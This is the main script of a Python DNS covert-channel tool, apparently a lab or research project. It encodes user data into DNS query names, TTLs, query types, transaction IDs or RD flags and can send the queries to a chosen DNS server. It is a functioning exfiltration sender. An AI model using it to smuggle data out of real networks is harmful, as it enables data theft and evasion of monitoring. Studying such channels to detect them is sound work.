#!/usr/bin/env python3
"""
DNS Covert Channel - Main Script

Usage:
    python main.py --channel base32 --data "secret message" --mode print
    python main.py --channel xor --data "secret message" --mode send --dns-server 8.8.8.8
    python main.py --channel hex --data "test" --mode both --domain example.com
"""

import argparse
import sys
from typing import Optional
import dns.message
import dns.flags

# Import covert channel implementations
from channels import (Base32Channel, HexChannel, XORBase32Channel, TTLChannel, TTLDNSChannel,
                      QTypeChannel, CaseToggleChannel, LabelCountChannel, TXIDChannel, RDFlagChannel)
from dns_packet_builder import DNSPacketBuilder
from dns_sender import DNSSender


# Available covert channels
CHANNELS = {
    'base32': Base32Channel,
    'hex': HexChannel,
    'xor': XORBase32Channel,
    'ttl': TTLChannel,
    'ttl-dns': TTLDNSChannel,
    'qtype': QTypeChannel,
    'case': CaseToggleChannel,
    'labels': LabelCountChannel,
    'txid': TXIDChannel,
    'rd': RDFlagChannel,
}


def list_channels():
    """List all available covert channels."""
    print("\nAvailable Covert Channels:")
    print("=" * 70)
    for name, channel_class in CHANNELS.items():
        instance = channel_class()
        print(f"\n{name}:")
        print(f"  {instance.get_description()}")
    print("=" * 70 + "\n")


def create_channel(channel_name: str, config: Optional[dict] = None):
    """
    Create a covert channel instance.

    Args:
        channel_name: Name of the channel
        config: Optional configuration dict

    Returns:
        CovertChannel instance
    """
    if channel_name not in CHANNELS:
        print(f"[!] Error: Unknown channel '{channel_name}'")
        print(f"[*] Available channels: {', '.join(CHANNELS.keys())}")
        sys.exit(1)

    channel_class = CHANNELS[channel_name]
    return channel_class(config)


def main():
    parser = argparse.ArgumentParser(
        description="DNS Covert Channel Tool - Send data hidden in DNS packets",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Print query only (no sending)
  python main.py --channel base32 --data "Hello World" --mode print

  # Send query to DNS server (no sudo required!)
  python main.py --channel xor --data "secret" --mode send --dns-server 8.8.8.8

  # Print and send query
  python main.py --channel hex --data "test123" --mode both --domain example.com

  # Use custom XOR key
  python main.py --channel xor --data "secret" --key "MyKey" --mode print

  # List all available channels
  python main.py --list-channels
        """
    )

    parser.add_argument(
        '--list-channels',
        action='store_true',
        help='List all available covert channels'
    )

    parser.add_argument(
        '--channel',
        type=str,
        choices=list(CHANNELS.keys()),
        help='Covert channel to use'
    )

    parser.add_argument(
        '--data',
        type=str,
        help='Data to encode and send'
    )

    parser.add_argument(
        '--mode',
        type=str,
        choices=['print', 'send', 'both'],
        default='print',
        help='Mode: print (show only), send (send only), or both (default: print)'
    )

    parser.add_argument(
        '--dns-server',
        type=str,
        default='192.168.10.1',
        help='DNS server IP address (default: 192.168.10.1)'
    )

    parser.add_argument(
        '--domain',
        type=str,
        default='example.com',
        help='Base domain for DNS query (default: example.com)'
    )

    parser.add_argument(
        '--qtype',
        type=str,
        default='A',
        help='DNS query type: A, AAAA, TXT, etc. (default: A)'
    )

    parser.add_argument(
        '--key',
        type=str,
        help='Encryption key for channels that support it (e.g., XOR)'
    )

    parser.add_argument(
        '--wait-response',
        action='store_true',
        help='Wait for DNS response when sending'
    )

    parser.add_argument(
        '--timeout',
        type=int,
        default=2,
        help='Response timeout in seconds (default: 2)'
    )

    parser.add_argument(
        '--use-tcp',
        action='store_true',
        help='Use TCP instead of UDP for DNS queries'
    )

    parser.add_argument(
        '--verbose',
        action='store_true',
        help='Show verbose query details'
    )

    args = parser.parse_args()

    # Handle list channels
    if args.list_channels:
        list_channels()
        return

    # Validate required arguments
    if not args.channel:
        parser.error("--channel is required (use --list-channels to see available channels)")

    if not args.data:
        parser.error("--data is required")

    # Create channel configuration
    config = {}
    if args.key:
        config['key'] = args.key

    # Create covert channel
    print(f"[*] Using covert channel: {args.channel}")
    channel = create_channel(args.channel, config)

    # Create query builder
    builder = DNSPacketBuilder(
        covert_channel=channel,
        dns_server=args.dns_server,
        timeout=args.timeout
    )

    # Create sender
    sender = DNSSender(builder)

    # Convert data to bytes
    data_bytes = args.data.encode('utf-8')
    print(f"[*] Original data: {args.data}")
    print(f"[*] Data size: {len(data_bytes)} bytes")

    # Check if using TTL channel (requires special handling)
    if args.channel == 'ttl':
        print(f"[*] Building DNS queries for TTL channel...")
        print(f"[!] TTL channel requires {len(data_bytes)} queries (1 per byte)")

        # Build TTL queries
        queries_with_ttl = builder.build_ttl_queries(
            data_bytes,
            domain=args.domain,
            qtype=args.qtype
        )

        # Process based on mode
        if args.mode == 'print':
            sender.print_ttl_queries(queries_with_ttl, verbose=args.verbose)

        elif args.mode == 'send':
            sender.print_ttl_queries(queries_with_ttl, verbose=False)
            sender.send_ttl_queries(
                queries_with_ttl,
                use_tcp=args.use_tcp,
                delay=0.1,
                verbose=args.verbose
            )

        elif args.mode == 'both':
            sender.print_ttl_queries(queries_with_ttl, verbose=args.verbose)
            sender.send_ttl_queries(
                queries_with_ttl,
                use_tcp=args.use_tcp,
                delay=0.1,
                verbose=args.verbose
            )

    # Check if using QTYPE channel (requires multiple queries with different types)
    elif args.channel == 'qtype':
        if not hasattr(channel, 'get_qtype_sequence'):
            print(f"[!] Error: {args.channel} channel doesn't support QTYPE sequence")
            sys.exit(1)
        
        qtype_sequence = channel.get_qtype_sequence(data_bytes)
        print(f"[*] Building DNS queries for QTYPE channel...")
        print(f"[!] QTYPE channel requires {len(qtype_sequence)} queries")
        print(f"[*] Query types: {', '.join(qtype_sequence[:10])}{'...' if len(qtype_sequence) > 10 else ''}")

        # Build multiple queries with different types
        queries = []
        for i, qtype in enumerate(qtype_sequence, 1):
            # Create DNS query directly using dnspython
            query = dns.message.make_query(
                qname=f"query{i}.{args.domain}",
                rdtype=qtype,
                rdclass='IN'
            )
            queries.append(query)

        # Process based on mode
        if args.mode == 'print':
            for i, query in enumerate(queries, 1):
                print(f"\n{'='*70}")
                print(f"QUERY {i}/{len(queries)}")
                print(f"{'='*70}")
                sender.print_query(query, verbose=args.verbose)

        elif args.mode == 'send':
            print(f"\n[*] Sending {len(queries)} queries...")
            sender.process_queries(queries, mode='send', use_tcp=args.use_tcp, delay=0.1)

        elif args.mode == 'both':
            sender.process_queries(queries, mode='both', use_tcp=args.use_tcp, delay=0.1)

    # Check if using RD flag channel (requires multiple queries with RD toggled)
    elif args.channel == 'rd':
        if not hasattr(channel, 'get_rd_flags'):
            print(f"[!] Error: {args.channel} channel doesn't support RD flag sequence")
            sys.exit(1)
        
        rd_flags = channel.get_rd_flags(data_bytes)
        print(f"[*] Building DNS queries for RD flag channel...")
        print(f"[!] RD flag channel requires {len(rd_flags)} queries (1 bit per query)")
        print(f"[*] First 16 flags: {['1' if f else '0' for f in rd_flags[:16]]}{'...' if len(rd_flags) > 16 else ''}")

        # Build multiple queries with different RD flags
        queries = []
        for i, rd_flag in enumerate(rd_flags, 1):
            # Create DNS query directly using dnspython
            query = dns.message.make_query(
                qname=f"query{i}.{args.domain}",
                rdtype=args.qtype,
                rdclass='IN'
            )
            # Set RD flag
            if rd_flag:
                query.flags |= dns.flags.RD  # Set RD
            else:
                query.flags &= ~dns.flags.RD  # Clear RD
            queries.append(query)

        # Process based on mode
        if args.mode == 'print':
            for i, query in enumerate(queries, 1):
                print(f"\n{'='*70}")
                print(f"QUERY {i}/{len(queries)} - RD={'SET' if rd_flags[i-1] else 'CLEAR'}")
                print(f"{'='*70}")
                sender.print_query(query, verbose=args.verbose)

        elif args.mode == 'send':
            print(f"\n[*] Sending {len(queries)} queries...")
            sender.process_queries(queries, mode='send', use_tcp=args.use_tcp, delay=0.1)

        elif args.mode == 'both':
            sender.process_queries(queries, mode='both', use_tcp=args.use_tcp, delay=0.1)

    # Check if using Label Count channel (requires multiple queries with different label depths)
    elif args.channel == 'labels':
        if not hasattr(channel, 'get_label_counts'):
            print(f"[!] Error: {args.channel} channel doesn't support label count sequence")
            sys.exit(1)
        
        label_counts = channel.get_label_counts(data_bytes)
        print(f"[*] Building DNS queries for Label Count channel...")
        print(f"[!] Label Count channel requires {len(label_counts)} queries")
        print(f"[*] Label depths: {label_counts[:10]}{'...' if len(label_counts) > 10 else ''}")

        # Build multiple queries with different label counts
        queries = []
        for i, label_count in enumerate(label_counts, 1):
            query_name = channel.build_query_name(label_count, args.domain)
            query = dns.message.make_query(qname=query_name, rdtype=args.qtype, rdclass='IN')
            queries.append(query)

        # Process based on mode
        if args.mode == 'print':
            for i, query in enumerate(queries, 1):
                print(f"\n{'='*70}")
                print(f"QUERY {i}/{len(queries)} - {label_counts[i-1]} labels")
                print(f"{'='*70}")
                sender.print_query(query, verbose=args.verbose)

        elif args.mode == 'send':
            print(f"\n[*] Sending {len(queries)} queries...")
            sender.process_queries(queries, mode='send', use_tcp=args.use_tcp, delay=0.1)

        elif args.mode == 'both':
            sender.process_queries(queries, mode='both', use_tcp=args.use_tcp, delay=0.1)

    # Check if using TXID channel (requires multiple queries with different TXIDs)
    elif args.channel == 'txid':
        if not hasattr(channel, 'get_txid_values'):
            print(f"[!] Error: {args.channel} channel doesn't support TXID sequence")
            sys.exit(1)
        
        txid_values = channel.get_txid_values(data_bytes)
        print(f"[*] Building DNS queries for TXID channel...")
        print(f"[!] TXID channel requires {len(txid_values)} queries (2 bytes per query)")
        print(f"[*] TXIDs: {txid_values[:10]}{'...' if len(txid_values) > 10 else ''}")

        # Build multiple queries with different TXIDs
        queries = []
        for i, txid in enumerate(txid_values, 1):
            # Create DNS query directly using dnspython
            query = dns.message.make_query(
                qname=f"query{i}.{args.domain}",
                rdtype=args.qtype,
                rdclass='IN'
            )
            query.id = txid  # Set custom TXID
            queries.append(query)

        # Process based on mode
        if args.mode == 'print':
            for i, query in enumerate(queries, 1):
                print(f"\n{'='*70}")
                print(f"QUERY {i}/{len(queries)} - TXID={txid_values[i-1]}")
                print(f"{'='*70}")
                sender.print_query(query, verbose=args.verbose)

        elif args.mode == 'send':
            print(f"\n[*] Sending {len(queries)} queries...")
            sender.process_queries(queries, mode='send', use_tcp=args.use_tcp, delay=0.1)

        elif args.mode == 'both':
            sender.process_queries(queries, mode='both', use_tcp=args.use_tcp, delay=0.1)

    else:
        # Standard channels (base32, hex, xor)
        print(f"[*] Building DNS query...")
        if args.qtype.upper() == 'TXT':
            query = builder.build_txt_query(data_bytes, domain=args.domain)
        else:
            query = builder.build_query(data_bytes, domain=args.domain, qtype=args.qtype)

        # Process based on mode
        if args.mode == 'print':
            sender.print_query(query, verbose=args.verbose)

        elif args.mode == 'send':
            response = sender.send_query(
                query,
                use_tcp=args.use_tcp,
                verbose=args.verbose
            )
            if response:
                sender.print_response(response, verbose=False)

        elif args.mode == 'both':
            response = sender.print_and_send(
                query,
                use_tcp=args.use_tcp,
                verbose_query=args.verbose,
                verbose_response=args.verbose,
                verbose_send=args.verbose
            )

    print("\n[+] Done!")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
